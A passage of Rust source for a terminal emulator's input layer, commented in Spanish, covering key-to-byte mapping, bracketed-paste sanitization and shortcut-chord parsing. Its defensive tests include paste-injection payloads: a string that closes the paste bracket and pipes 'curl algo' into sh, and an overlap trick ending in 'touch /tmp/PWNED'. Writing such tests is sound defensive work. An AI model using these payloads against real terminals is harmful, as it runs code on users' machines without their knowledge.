//! Qué bytes manda al programa cada tecla.
//!
//! Es una función pura de un evento de la ventana a los bytes que un terminal enviaría. No escribe
//! en ningún sitio: quien los mande es el bucle, y por dónde los mande es el puente.
//!
//! **Dónde se corta este hito, y por qué.** Quedan fuera Alt, las teclas de función y el teclado
//! numérico. Ninguna hace falta para escribir órdenes en un shell ni para moverse por un editor,
//! que es lo que el hito tiene que poder demostrar; y las tres arrastran una decisión que aquí no
//! toca tomar —Alt antepone un escape a lo que envía la tecla, y las otras dos cambian de bytes
//! según el modo en que esté el programa—. Meterlas sin poder verlas funcionando sería escribir
//! tablas a ciegas. Lo que queda fuera devuelve silencio, nunca un byte aproximado: un byte
//! equivocado el programa de dentro lo entiende como otra tecla, y eso es peor que no recibir nada.

use eframe::egui::{Event, Key, Modifiers};
use std::borrow::Cow;

/// Los bytes que le corresponden a un evento, o nada si ese evento no se traduce.
pub fn bytes(event: &Event) -> Option<Cow<'static, [u8]>> {
    match event {
        // El texto ya viene resuelto por el sistema: acentos, teclas muertas y métodos de entrada
        // incluidos. Traducirlo desde la tecla física en vez de desde aquí sería rehacer mal el
        // trabajo del escritorio.
        Event::Text(text) if !text.is_empty() => Some(Cow::Owned(text.as_bytes().to_vec())),

        // **Estas tres teclas no llegan como teclas.** La capa que traduce los eventos del sistema
        // operativo mira Ctrl+C, Ctrl+X y Ctrl+V *antes* de emitir nada y las convierte en copiar,
        // cortar y pegar, sin emitir el evento de tecla. En un escritorio normal eso es lo que se
        // espera; en un terminal, Ctrl+C es la forma de interrumpir un programa colgado, así que
        // hay que recogerlas por esta puerta o no interrumpen nada.
        //
        // **Lo que esto cuesta, dicho claro:** mientras el portapapeles no exista, en esta ventana
        // no se puede copiar. Estos eventos no traen los modificadores, así que desde aquí no hay
        // forma de distinguir Ctrl+C de Ctrl+Mayúsculas+C —que es como se copia en un terminal—, y
        // las dos acaban interrumpiendo. Quien traiga el portapapeles tendrá que decidirlo antes,
        // en el bucle, donde el estado de los modificadores sí está disponible.
        Event::Copy => Some(Cow::Borrowed(&[3])),
        Event::Cut => Some(Cow::Borrowed(&[24])),
        // **Aquí llegan los dos atajos, y por esta puerta son indistinguibles.** El escritorio emite
        // el mismo `Paste` para Ctrl+V y para Ctrl+Mayúsculas+V, sin modificadores. Quien decide cuál
        // es cuál es el bucle, que reconstruye los modificadores recorriendo los eventos en orden y
        // llama a [`paste`] cuando toca; lo que llegue hasta aquí es el caso sin Mayúsculas.
        //
        // Y ese caso **no pega**: Ctrl+V vale en un terminal lo que vale el byte de control, que es
        // «lo siguiente, literal» para un shell y el bloque visual para vim. Robárselo para pegar
        // sería quitar dos cosas que se usan a diario. Que un programa de dentro decida que para él
        // ese byte significa pegar —Claude lo hace— es asunto suyo, y así sigue funcionando.
        Event::Paste(_) => Some(Cow::Borrowed(&[22])),

        // Soltar una tecla no manda nada. La repetición de mantenerla pulsada sí: es lo que hace
        // que dejar apretada una flecha mueva el cursor.
        Event::Key {
            key,
            pressed: true,
            modifiers,
            ..
        } => key_bytes(*key, *modifiers),

        _ => None,
    }
}

/// Lo que se le manda al programa cuando se pega texto de verdad.
///
/// `bracketed` es lo que el programa de dentro haya pedido: con él, el texto va rodeado de las dos
/// secuencias que dicen «esto viene pegado», y un shell que las entiende lo deja escrito en vez de
/// ejecutarlo línea a línea.
///
/// **Los saltos de línea salen como retorno de carro**, igual que la tecla Enter y por la misma
/// razón: es lo que un terminal envía. Pegar «a⏎b» tiene que hacer exactamente lo que teclear a,
/// Enter, b. Aquí solo hay `\n` que convertir, porque el escritorio ya normaliza `\r\n` antes de
/// entregarlo.
///
/// **Del texto se quitan todos los caracteres de control menos el tabulador y los saltos de línea**,
/// y hacen falta las dos mitades de esa frase.
///
/// La primera razón es el envoltorio. Un portapapeles copiado de cualquier sitio puede traer su
/// secuencia de cierre escondida; si se colase, cerraría la marca por su cuenta y lo que viniera
/// detrás llegaría como si lo hubiera tecleado el usuario — **ejecutándose sin Enter**, que es justo
/// lo que la marca existe para impedir. El motor de terminal no filtra nada: se comprobó, y no hay
/// una sola mención de estas secuencias en toda la caja.
///
/// **Y quitar solo esa secuencia no basta, comprobado con un ataque que funcionaba.** Buscar y borrar
/// hace una pasada sobre el original y no vuelve a mirar lo que deja: con `ESC[2` + el cierre + `01~`,
/// la única aparición está en medio, y al borrarla **los trozos de los lados se pegan y forman un
/// cierre nuevo** que ya nadie ve.
///
/// **La segunda razón es peor, y el envoltorio no protege de ella en absoluto.** Los caracteres de
/// control los procesa **la disciplina de línea del núcleo**, que ve los bytes *antes* que el
/// programa: un `0x03` en el portapapeles manda una interrupción al proceso en primer plano, un
/// `0x1a` suspende el shell y deja la división con pinta de muerta, un `0x1c` provoca un volcado, y
/// un `0x04` cierra la entrada — y si se cierran las dos consolas, la ventana entera. Marcar el
/// pegado no cambia nada de eso, porque el envoltorio es cosa de la aplicación de dentro y el núcleo
/// actúa primero. Es por esto que `xterm` y `VTE` filtran los controles del pegado desde hace años.
///
/// **Lo que cuesta, dicho claro:** un texto con secuencias de color pierde sus escapes y el resto se
/// queda como texto corriente — pegar un volcado coloreado deja `[32mok[0m` en la línea. Es lo mismo
/// que hace `xterm` con su comportamiento por defecto, y se acepta por la misma razón: desde aquí no
/// hay forma de distinguir el control que el usuario quería del que le colaron, y un terminal cuyo
/// pegado puede ejecutar o suspender es peor que uno que pega en texto plano.
///
/// Se filtra **también cuando no se envuelve**: el modo se consulta al componer y el programa puede
/// haberlo cambiado justo después; y el peligro del núcleo no depende del envoltorio.
pub fn paste(text: &str, bracketed: bool) -> Vec<u8> {
    const OPENS: &[u8] = b"\x1b[200~";
    const CLOSES: &[u8] = b"\x1b[201~";

    // Se compone de una pasada y con la reserva hecha: el portapapeles puede ser de megabytes y esto
    // corre en el hilo que pinta.
    let mut body = Vec::with_capacity(text.len() + OPENS.len() + CLOSES.len());
    if bracketed {
        body.extend_from_slice(OPENS);
    }
    let before = body.len();

    // **Cómo sale un salto de línea depende de si hay marca, y meter la pata aquí se ve en pantalla.**
    //
    // *Sin marca*, el programa no puede distinguir lo pegado de lo tecleado, así que hay que imitar la
    // tecla: Enter manda **retorno de carro**, y pegar «a, salto, b» tiene que hacer lo mismo que
    // teclear a, Enter, b.
    //
    // *Con marca*, el texto va **tal cual**: el programa sabe que es un pegado y decide él qué hacer
    // con los saltos —un shell moderno deja las dos líneas escritas sin ejecutar ninguna—. Mandarle
    // ahí un retorno de carro es mandarle **un carácter de control dentro de un texto**, y lo que hace
    // es insertarlo literal: aparece un cuadro en medio de la orden y `echo` lo imprime. Comprobado en
    // pantalla, que es como se descubrió.
    let newline = if bracketed { b'\n' } else { b'\r' };

    for byte in text.bytes() {
        match byte {
            // El escritorio ya normaliza los pares antes de entregarlo, así que un retorno suelto que
            // llegue aquí venía solo y vale lo mismo que un salto.
            b'\n' | b'\r' => body.push(newline),
            b'\t' => body.push(b'\t'),
            0x00..=0x1f | 0x7f => {}
            other => body.push(other),
        }
    }

    // Sin nada que mandar no se manda ni la marca: un envoltorio vacío es ruido que el programa de
    // dentro tiene que interpretar para nada.
    if body.len() == before {
        return Vec::new();
    }

    if bracketed {
        body.extend_from_slice(CLOSES);
    }
    body
}

fn key_bytes(key: Key, modifiers: Modifiers) -> Option<Cow<'static, [u8]>> {
    // Alt y la tecla de comando de macOS quedan fuera del hito, y «fuera» significa silencio: Alt
    // antepone un escape, así que mandar el byte pelado no sería una aproximación, sería otra
    // tecla. Mayúsculas sí pasa, porque no cambia el código de control — es lo que hace `xterm`.
    if modifiers.alt || modifiers.mac_cmd {
        return None;
    }
    if modifiers.ctrl
        && let Some(control_byte) = with_ctrl(key)
    {
        return Some(Cow::Owned(vec![control_byte]));
    }
    // Si Ctrl acompaña a algo que no es una letra, se cae a la tabla de siempre en vez de callar:
    // Ctrl+Enter manda retorno igual que Enter, y quedarse mudo sería una tecla muerta.
    let bytes_out: &'static [u8] = match key {
        // Retorno de carro, no salto de línea: es lo que envía un terminal, y lo que el programa
        // de dentro traduce según le convenga.
        Key::Enter => b"\r",
        // Con Mayúsculas, Tab es otra tecla: retrocede la tabulación en vez de avanzarla, y tiene
        // su propia secuencia. Mandar el tabulador de siempre movería el foco al revés de como el
        // programa lo pidió.
        Key::Tab if modifiers.shift => b"\x1b[Z",
        Key::Tab => b"\t",
        // Los terminales modernos mandan borrar, no retroceso. Con el otro byte, el shell borra
        // pero muchos editores no.
        Key::Backspace => &[0x7F],
        Key::Escape => &[0x1B],
        // Las cuatro flechas en modo normal. Un programa puede pedir el modo de aplicación, en el
        // que cambian de forma; eso queda fuera de este hito y está escrito arriba.
        Key::ArrowUp => b"\x1b[A",
        Key::ArrowDown => b"\x1b[B",
        Key::ArrowRight => b"\x1b[C",
        Key::ArrowLeft => b"\x1b[D",
        _ => return None,
    };
    Some(Cow::Borrowed(bytes_out))
}

/// Ctrl con una letra da los códigos de control del 1 al 26.
///
/// Es la regla de siempre —la letra menos sesenta y cuatro— y es la que hace que Ctrl+D cierre la
/// entrada y Ctrl+Z suspenda.
///
/// Las veintiséis van escritas una a una, y no sacadas del nombre de la tecla, aunque ese nombre
/// resulte ser hoy la propia letra: ese texto está pensado para enseñárselo a una persona en un
/// menú de atajos, no es un contrato. Si mañana cambia, un byte de control cambiaría con él sin
/// que nada dejara de compilar.
fn with_ctrl(key: Key) -> Option<u8> {
    let control_byte = match key {
        Key::A => 1,
        Key::B => 2,
        Key::C => 3,
        Key::D => 4,
        Key::E => 5,
        Key::F => 6,
        Key::G => 7,
        Key::H => 8,
        Key::I => 9,
        Key::J => 10,
        Key::K => 11,
        Key::L => 12,
        Key::M => 13,
        Key::N => 14,
        Key::O => 15,
        Key::P => 16,
        Key::Q => 17,
        Key::R => 18,
        Key::S => 19,
        Key::T => 20,
        Key::U => 21,
        Key::V => 22,
        Key::W => 23,
        Key::X => 24,
        Key::Y => 25,
        Key::Z => 26,
        _ => return None,
    };
    Some(control_byte)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn chord_of(key: Key, modifiers: Modifiers) -> Option<Vec<u8>> {
        bytes(&Event::Key {
            key,
            physical_key: None,
            pressed: true,
            repeat: false,
            modifiers,
        })
        .map(|b| b.into_owned())
    }

    fn press(key: Key) -> Option<Vec<u8>> {
        chord_of(key, Modifiers::NONE)
    }

    fn press_with_ctrl(key: Key) -> Option<Vec<u8>> {
        chord_of(key, Modifiers::CTRL)
    }

    fn text(s: &str) -> Option<Vec<u8>> {
        bytes(&Event::Text(s.into())).map(|b| b.into_owned())
    }

    #[test]
    fn el_texto_viaja_tal_cual_en_utf8() {
        assert_eq!(text("ls"), Some(b"ls".to_vec()));
        // Un carácter que no es ASCII ocupa varios bytes y tiene que salir entero.
        assert_eq!(text("ñ"), Some(vec![0xC3, 0xB1]), "la eñe son dos bytes");
    }

    #[test]
    fn el_texto_vacio_es_nada_que_mandar_y_no_una_lista_vacia() {
        // Devolver algo vacío obligaría a quien llame a distinguir «no hay nada que mandar» de «no
        // se traduce», que son la misma decisión para él.
        assert_eq!(text(""), None);
    }

    #[test]
    fn las_cuatro_teclas_de_control_basicas() {
        // Retorno de carro, no salto de línea.
        assert_eq!(press(Key::Enter), Some(vec![0x0D]));
        assert_eq!(press(Key::Tab), Some(vec![0x09]));
        // Borrar, no retroceso: con 0x08 el shell borra pero muchos editores no.
        assert_eq!(press(Key::Backspace), Some(vec![0x7F]));
        assert_eq!(press(Key::Escape), Some(vec![0x1B]));
    }

    #[test]
    fn las_flechas_van_como_secuencia_de_escape() {
        assert_eq!(press(Key::ArrowUp), Some(b"\x1b[A".to_vec()));
        assert_eq!(press(Key::ArrowDown), Some(b"\x1b[B".to_vec()));
        assert_eq!(press(Key::ArrowRight), Some(b"\x1b[C".to_vec()));
        assert_eq!(press(Key::ArrowLeft), Some(b"\x1b[D".to_vec()));
    }

    #[test]
    fn las_veintiseis_letras_caen_en_su_sitio_y_ninguna_se_sale() {
        let letters = [
            Key::A,
            Key::B,
            Key::C,
            Key::D,
            Key::E,
            Key::F,
            Key::G,
            Key::H,
            Key::I,
            Key::J,
            Key::K,
            Key::L,
            Key::M,
            Key::N,
            Key::O,
            Key::P,
            Key::Q,
            Key::R,
            Key::S,
            Key::T,
            Key::U,
            Key::V,
            Key::W,
            Key::X,
            Key::Y,
            Key::Z,
        ];
        for (i, key) in letters.iter().enumerate() {
            let expected = (i + 1) as u8;
            assert_eq!(
                press_with_ctrl(*key),
                Some(vec![expected]),
                "la letra en la posición {i} no da su código de control"
            );
        }
        // Los dos que se usan a diario, nombrados para que se lea qué está en juego.
        assert_eq!(press_with_ctrl(Key::D), Some(vec![4]), "cierra la entrada");
        assert_eq!(press_with_ctrl(Key::Z), Some(vec![26]), "suspende");
    }

    #[test]
    fn interrumpir_cortar_y_pegar_llegan_por_su_propia_puerta() {
        // La capa de debajo se queda con Ctrl+C, Ctrl+X y Ctrl+V y las convierte en copiar, cortar
        // y pegar antes de emitir tecla ninguna. Si este caso desapareciera, **Ctrl+C dejaría de
        // interrumpir** y ningún test de teclas lo notaría.
        assert_eq!(
            bytes(&Event::Copy).map(|b| b.into_owned()),
            Some(vec![3]),
            "Ctrl+C tiene que seguir interrumpiendo"
        );
        assert_eq!(bytes(&Event::Cut).map(|b| b.into_owned()), Some(vec![24]));
        assert_eq!(
            bytes(&Event::Paste("lo que hubiera".into())).map(|b| b.into_owned()),
            Some(vec![22]),
            "pegar de verdad es de otro hito; aquí vale lo que vale en un terminal"
        );
    }

    #[test]
    fn una_tecla_de_letra_por_si_sola_no_manda_nada() {
        // La capa de debajo emite **dos** eventos por cada pulsación normal: la tecla y el texto
        // que produce. Si la tabla de teclas contestara también a las letras, cada carácter que
        // escribiera el usuario llegaría por duplicado al programa de dentro. El texto es el que
        // manda, y la tecla tiene que callar.
        assert_eq!(press(Key::A), None);
        assert_eq!(press(Key::Z), None);
        assert_eq!(press(Key::Space), None);
        assert_eq!(press(Key::Num0), None);
        // Y con mayúsculas igual: la «A» también viaja como texto.
        assert_eq!(chord_of(Key::A, Modifiers::SHIFT), None);
    }

    #[test]
    fn el_control_de_linux_y_windows_viaja_ademas_en_command() {
        // Fuera de macOS, Ctrl llega marcado en los dos sitios a la vez. Confundir ese `command`
        // con la tecla de comando de macOS **dejaría a Linux y Windows sin ningún Ctrl**.
        //
        // Se prueba con la D y no con la C, la X o la V: esas tres nunca llegan como tecla porque
        // la capa de debajo las convierte antes en copiar, cortar y pegar.
        let linux_ctrl = Modifiers {
            ctrl: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, linux_ctrl), Some(vec![4]));
    }

    #[test]
    fn la_tecla_de_comando_de_macos_no_manda_bytes_de_control() {
        // En macOS ⌘ llega sin `ctrl` y con `mac_cmd`. Si se tratara como un Ctrl cualquiera,
        // ⌘+Q pediría salir de la aplicación y además mandaría el byte que cuelga la salida del
        // terminal.
        let macos_command = Modifiers {
            mac_cmd: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::Q, macos_command), None);
        assert_eq!(chord_of(Key::Enter, macos_command), None);
    }

    #[test]
    fn mayusculas_con_enter_sigue_siendo_retorno() {
        // Mayúsculas sola no pasa por la tabla de códigos de control, así que necesita su propia
        // prueba: si se filtrara como se filtra Alt, **Mayúsculas+Enter sería una tecla muerta**.
        assert_eq!(chord_of(Key::Enter, Modifiers::SHIFT), Some(vec![0x0D]));
    }

    #[test]
    fn mayusculas_con_tabulador_retrocede_en_vez_de_avanzar() {
        // Es la única tecla a la que Mayúsculas le cambia el significado: con ella el programa
        // retrocede el foco en vez de avanzarlo. Si esto mandara el tabulador de siempre,
        // **moverse hacia atrás por un formulario iría hacia delante**.
        assert_eq!(
            chord_of(Key::Tab, Modifiers::SHIFT),
            Some(b"\x1b[Z".to_vec())
        );
        assert_eq!(
            press(Key::Tab),
            Some(vec![0x09]),
            "y sin Mayúsculas, avanza"
        );
    }

    #[test]
    fn el_byte_lo_decide_la_tecla_logica_y_no_la_fisica() {
        // La capa de debajo manda las dos: la que dice la distribución del teclado y la posición
        // física. En una distribución que no sea la inglesa no coinciden, y hacer caso a la
        // posición mandaría el byte de control **de otra letra**.
        let in_another_layout = Event::Key {
            key: Key::D,
            physical_key: Some(Key::H),
            pressed: true,
            repeat: false,
            modifiers: Modifiers::CTRL,
        };
        assert_eq!(
            bytes(&in_another_layout).map(|b| b.into_owned()),
            Some(vec![4]),
            "cierra la entrada, no borra"
        );
    }

    #[test]
    fn mayusculas_no_cambia_el_codigo_de_control() {
        // Es lo que hace un terminal de verdad: Ctrl+Shift+C manda lo mismo que Ctrl+C.
        let ctrl_shift = Modifiers {
            ctrl: true,
            shift: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, ctrl_shift), Some(vec![4]));
    }

    #[test]
    fn alt_no_manda_un_byte_aproximado() {
        // Alt antepone un escape a lo que envía la tecla. Mandar el byte pelado no sería una
        // aproximación: el programa de dentro lo entendería como otra pulsación.
        let ctrl_alt = Modifiers {
            ctrl: true,
            alt: true,
            command: true,
            ..Modifiers::NONE
        };
        assert_eq!(chord_of(Key::D, ctrl_alt), None);
        assert_eq!(chord_of(Key::Enter, Modifiers::ALT), None);
    }

    #[test]
    fn control_con_una_tecla_que_no_es_letra_cae_en_la_tabla_de_siempre() {
        // Quedarse mudo aquí convertiría a Ctrl+Enter en una tecla muerta, cuando lo que manda un
        // terminal es exactamente lo mismo que sin Ctrl.
        assert_eq!(press_with_ctrl(Key::Enter), Some(vec![0x0D]));
        assert_eq!(press_with_ctrl(Key::Backspace), Some(vec![0x7F]));
        assert_eq!(press_with_ctrl(Key::ArrowUp), Some(b"\x1b[A".to_vec()));
        // Y lo que no está en ninguna de las dos tablas sigue sin mandar nada.
        assert_eq!(press_with_ctrl(Key::F1), None);
    }

    #[test]
    fn soltar_una_tecla_no_manda_nada() {
        let release = Event::Key {
            key: Key::Enter,
            physical_key: None,
            pressed: false,
            repeat: false,
            modifiers: Modifiers::NONE,
        };
        assert!(bytes(&release).is_none());
    }

    #[test]
    fn mantener_una_tecla_pulsada_sigue_mandando() {
        // La repetición es lo que hace que dejar apretada una flecha mueva el cursor. Filtrarla
        // sería romper algo que se nota a la primera.
        let repeated = Event::Key {
            key: Key::ArrowDown,
            physical_key: None,
            pressed: true,
            repeat: true,
            modifiers: Modifiers::NONE,
        };
        assert_eq!(
            bytes(&repeated).map(|b| b.into_owned()),
            Some(b"\x1b[B".to_vec())
        );
    }

    #[test]
    fn las_teclas_que_este_hito_deja_fuera_no_inventan_bytes() {
        // Están fuera a propósito, y lo que importa es que se note como silencio y no como un byte
        // equivocado que el programa de dentro interpretaría como otra cosa.
        assert_eq!(press(Key::F1), None);
        assert_eq!(press(Key::Home), None);
        assert_eq!(press(Key::PageUp), None);
        assert_eq!(press(Key::Delete), None);
    }

    #[test]
    fn sin_marca_los_saltos_imitan_la_tecla_enter() {
        // Sin marca el programa no distingue lo pegado de lo tecleado, así que hay que imitar la
        // tecla: Enter manda retorno de carro. Mandar 0x0A sería otra tecla.
        assert_eq!(paste("ls\n", false), b"ls\r");
        assert_eq!(paste("a\nb", false), b"a\rb");
        assert_eq!(paste("sin saltos", false), b"sin saltos");
    }

    #[test]
    fn con_marca_los_saltos_van_tal_cual_y_no_como_retorno() {
        // **Esto se descubrió mirando la pantalla, no un test.** Con marca, un retorno de carro no es
        // «la tecla Enter»: es un carácter de control dentro de un texto que el programa va a insertar
        // literal. Pegando dos órdenes salía «echo uno ▯ echo dos» con un cuadro en medio, y al pulsar
        // Enter el shell imprimía el cuadro. El salto tiene que ir como salto y que decida el programa.
        assert_eq!(
            paste("echo uno\necho dos", true),
            b"\x1b[200~echo uno\necho dos\x1b[201~"
        );
        // Un retorno suelto en el texto vale lo mismo que un salto, también aquí.
        assert_eq!(paste("a\rb", true), b"\x1b[200~a\nb\x1b[201~");
    }

    #[test]
    fn con_el_programa_pidiendolo_el_texto_va_marcado_como_pegado() {
        assert_eq!(paste("ls\n", true), b"\x1b[200~ls\n\x1b[201~");
    }

    #[test]
    fn el_texto_no_puede_cerrar_su_propia_marca() {
        // **Es el borde que convierte pegar en ejecutar sin Enter.** Un portapapeles copiado de
        // cualquier sitio puede traer la secuencia de cierre escondida; si se colase, cerraría la
        // marca por su cuenta y lo que viniera detrás llegaría como tecleado por el usuario. El
        // motor de terminal no filtra nada — se comprobó—, así que si no lo hace esto, nadie lo hace.
        //
        // **El segundo caso es un ataque que funcionaba** y que un revisor adversario encontró: con
        // el filtrado anterior —buscar y borrar la secuencia— los trozos de los lados se pegaban al
        // quitar la del medio y formaban un cierre nuevo que ya nadie miraba. Por eso ahora se afirma
        // sobre la invariante y no sobre un caso: **en el cuerpo no hay ni un escape**.
        let poisons = [
            "inocente\x1b[201~; curl algo | sh\n",
            // El solapamiento: `ESC[2` + el cierre + `01~`.
            "\x1b[2\x1b[201~01~; touch /tmp/PWNED\n",
        ];

        for poison in poisons {
            let bracketed = String::from_utf8(paste(poison, true)).expect("es texto");
            let body = bracketed
                .strip_prefix("\x1b[200~")
                .and_then(|s| s.strip_suffix("\x1b[201~"))
                .unwrap_or_else(|| panic!("la marca no envuelve lo que debería: {bracketed:?}"));
            assert!(
                !body.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n'),
                "quedó un carácter de control dentro de la marca: {body:?}"
            );

            // Y sin marcar tampoco: el modo se consulta al componer y puede cambiar justo después.
            let stripped = String::from_utf8(paste(poison, false)).expect("es texto");
            assert!(
                !stripped
                    .bytes()
                    .any(|b| b < 0x20 && b != b'\t' && b != b'\r'),
                "pasó un carácter de control sin marcar: {stripped:?}"
            );
        }
    }

    #[test]
    fn los_controles_del_portapapeles_no_llegan_al_nucleo() {
        // **El envoltorio no protege de esto y por eso hace falta el filtro.** Los caracteres de
        // control los procesa la disciplina de línea del núcleo, que ve los bytes antes que el
        // programa: 0x03 interrumpe, 0x1a suspende el shell, 0x1c provoca un volcado y 0x04 cierra la
        // entrada. Un portapapeles hostil los lleva sin que se vean al pegarlos.
        let hostile = "echo hola\x03\x1a\x1c\x04 y sigue\n";

        for bracketed in [true, false] {
            let bytes_out = paste(hostile, bracketed);
            let body = if bracketed {
                &bytes_out[6..bytes_out.len() - 6]
            } else {
                &bytes_out[..]
            };
            for byte in body {
                assert!(
                    *byte >= 0x20 || *byte == b'\t' || *byte == b'\n' || *byte == b'\r',
                    "un control llegó al programa: {byte:#04x} en {body:?}"
                );
            }
        }
    }

    #[test]
    fn el_tabulador_y_los_saltos_sobreviven_al_filtro() {
        // Son los tres controles que un texto pegado lleva de verdad, y quitarlos convertiría pegar
        // una tabla o un guion en pegar una sola línea corrida.
        assert_eq!(paste("a\tb\nc", false), b"a\tb\rc");
        assert_eq!(paste("a\tb\nc", true), b"\x1b[200~a\tb\nc\x1b[201~");
        // Un retorno suelto vale lo mismo que un salto: el escritorio ya normalizó los pares.
        assert_eq!(paste("a\rb", false), b"a\rb");
    }

    #[test]
    fn pegar_nada_no_manda_nada_ni_una_marca_vacia() {
        assert!(paste("", true).is_empty());
        assert!(paste("", false).is_empty());
        // Un texto que era solo controles se queda en nada, y tampoco manda la marca vacía.
        assert!(paste("\x1b\x1b\x1b", true).is_empty());
        assert!(paste("\x03\x04\x1a", true).is_empty());

        // **Pero lo que queda al quitarle el escape SÍ se manda, y eso es lo correcto.** `[201~` sin
        // su escape delante es texto corriente: se escribe en la línea, no cierra nada. Tirarlo sería
        // comerse caracteres que el usuario pegó a propósito.
        let left = String::from_utf8(paste("\x1b[201~", true)).expect("es texto");
        assert_eq!(left, "\x1b[200~[201~\x1b[201~");
    }

    #[test]
    fn un_evento_que_no_es_de_teclado_se_ignora() {
        assert!(bytes(&Event::WindowFocused(true)).is_none());
    }
}

// ── Los atajos de la aplicación: qué acorde hace qué ────────────────────────────────────────────

/// Lo que la aplicación hace cuando alguien pulsa un acorde suyo.
///
/// **Once, y son las que hoy existen.** No es una lista abierta a propósito: cada una tiene su condición y
/// su efecto escritos en el sitio donde ocurren, y una acción sin efecto sería un nombre que se puede
/// configurar y no hace nada.
///
/// **Copiar y pegar no están aquí, y no es un olvido.** Sus acordes **no llegan como teclas**: el
/// escritorio los resuelve antes y llegan como eventos propios, sin acorde que reasignar ni que devolverle
/// al programa de dentro. Lo de pegar está comprobado desde F2.6; lo de copiar lo destapó una revisión de
/// este hito, **ejecutándolo**, y de paso encontró que hasta entonces copiar no copiaba: interrumpía el
/// programa.
///
/// De copiar solo se puede **apagar** la atención, con `key.copy = none`; pegar no tiene clave.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Action {
    SplitRight,
    SplitDown,
    ClosePane,
    NewTab,
    CloseTab,
    PreviousTab,
    NextTab,
    ScrollPageUp,
    ScrollPageDown,
    ScrollToTop,
    ScrollToBottom,
}

impl Action {
    /// Cómo se escribe en el fichero de configuración.
    pub fn as_written(self) -> &'static str {
        match self {
            Self::SplitRight => "split-right",
            Self::SplitDown => "split-down",
            Self::ClosePane => "close-pane",
            Self::NewTab => "new-tab",
            Self::CloseTab => "close-tab",
            Self::PreviousTab => "previous-tab",
            Self::NextTab => "next-tab",
            Self::ScrollPageUp => "scroll-page-up",
            Self::ScrollPageDown => "scroll-page-down",
            Self::ScrollToTop => "scroll-to-top",
            Self::ScrollToBottom => "scroll-to-bottom",
        }
    }

    /// La que se escribe así, si alguna.
    pub fn from_written(text: &str) -> Option<Self> {
        ALL.iter()
            .copied()
            .find(|action| action.as_written() == text)
    }
}

/// Las once, para recorrerlas.
pub const ALL: [Action; 11] = [
    Action::SplitRight,
    Action::SplitDown,
    Action::ClosePane,
    Action::NewTab,
    Action::CloseTab,
    Action::PreviousTab,
    Action::NextTab,
    Action::ScrollPageUp,
    Action::ScrollPageDown,
    Action::ScrollToTop,
    Action::ScrollToBottom,
];

/// Un acorde: las teclas de mando que hacen falta, y la tecla.
///
/// **`Copy` y comparable por valor**, porque es la clave con la que se busca en la tabla una vez por
/// evento de teclado — el camino más caliente que este proyecto tiene.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct Chord {
    pub ctrl: bool,
    pub shift: bool,
    pub alt: bool,
    pub key: eframe::egui::Key,
}

impl Chord {
    /// El acorde que se escribe así, si se puede.
    ///
    /// Las partes van separadas por `+`, en cualquier orden y sin importar mayúsculas: `ctrl+shift+e`,
    /// `Shift+Prior`, `alt+f4`.
    pub fn from_written(text: &str) -> Option<Self> {
        let mut chord = Self {
            ctrl: false,
            shift: false,
            alt: false,
            key: eframe::egui::Key::Space,
        };
        let mut key = None;
        for part in text.split('+') {
            let part = part.trim();
            match part.to_ascii_lowercase().as_str() {
                "ctrl" | "control" => chord.ctrl = true,
                "shift" => chord.shift = true,
                "alt" => chord.alt = true,
                _ => {
                    // **Una sola tecla por acorde.** Dos serían un acorde que no se puede pulsar, y
                    // aceptarlo dejaría al usuario esperando que funcionara.
                    if key.is_some() {
                        return None;
                    }
                    key = Some(key_named(part)?);
                }
            }
        }
        chord.key = key?;
        // **Los acordes de copiar y de pegar no se pueden reclamar, y aceptarlos sería prometer algo que
        // no ocurre.** El escritorio los resuelve **antes** de que lleguen: no aparecen como teclas, llegan
        // ya convertidos en un copiado o un pegado, y **sin decir si había Mayúsculas**. Un
        // `key.split-right = ctrl+shift+c` se aceptaría, no funcionaría nunca, y quien lo escribió no
        // tendría forma de saber por qué.
        if chord.ctrl && matches!(chord.key, eframe::egui::Key::C | eframe::egui::Key::V) {
            return None;
        }
        // **Un acorde sin ninguna tecla de mando se le queda al programa de dentro.** Admitirlo sería
        // dejar que quien configura se quite la `a` de escribir sin que nada se lo advierta.
        (chord.ctrl || chord.shift || chord.alt).then_some(chord)
    }
}

/// La tecla que se escribe así, si existe.
///
/// **`Key::from_name` distingue mayúsculas y quien escribe un fichero de configuración no**: `F4` sí y
/// `f4` no, `PageUp` sí y `pageup` no. Comprobado ejecutándolo. Así que se prueba tal cual, y si no, con
/// la inicial en mayúscula.
///
/// **Y hay alias.** `prior` y `next` son como los llaman los terminales de siempre —y como los llamaba el
/// documento de este proyecto antes de que nadie comprobara que no existen—; `pgup`, `pgdn` y `esc` son las
/// abreviaturas que están escritas en la propia tecla.
fn key_named(name: &str) -> Option<eframe::egui::Key> {
    use eframe::egui::Key;
    let alias = match name.to_ascii_lowercase().as_str() {
        "prior" | "pgup" => Some(Key::PageUp),
        "next" | "pgdn" => Some(Key::PageDown),
        "esc" => Some(Key::Escape),
        // **Las flechas se escriben también con la flecha, y así las publica el documento del proyecto.**
        // No aceptarlas fue un desajuste real entre lo que se prometía y lo que el código entendía, cazado
        // contrastando el documento contra la fuente. **El símbolo no tiene idioma**, así que sobrevive al
        // hito: lo que se retira es el nombre en español, no el dibujo de la tecla.
        //
        // **Y solo el símbolo: `up`, `down`, `left` y `right` NO están aquí porque no hacen falta.** egui
        // llama a estas cuatro teclas `Up`, `Down`, `Left` y `Right`, así que el respaldo de abajo ya las
        // resuelve por su nombre. Medido antes de quitarlas: sin estos cuatro brazos la suite entera sigue
        // verde, incluidos los casos que las prueban. Un alias que repite lo que el respaldo ya hace se lee
        // como una decisión y no lo es.
        "↑" => Some(Key::ArrowUp),
        "↓" => Some(Key::ArrowDown),
        "←" => Some(Key::ArrowLeft),
        "→" => Some(Key::ArrowRight),
        _ => None,
    };
    if alias.is_some() {
        return alias;
    }
    // **Se busca entre TODAS ignorando mayúsculas, y no dándole la vuelta al nombre.** Poner la inicial
    // en mayúscula arregla `f4` pero no `pageup`, que de verdad se llama `PageUp` con dos. Recorrer la
    // lista es una vez por línea del fichero, no por fotograma.
    Key::ALL
        .iter()
        .copied()
        .find(|key| key.name().eq_ignore_ascii_case(name))
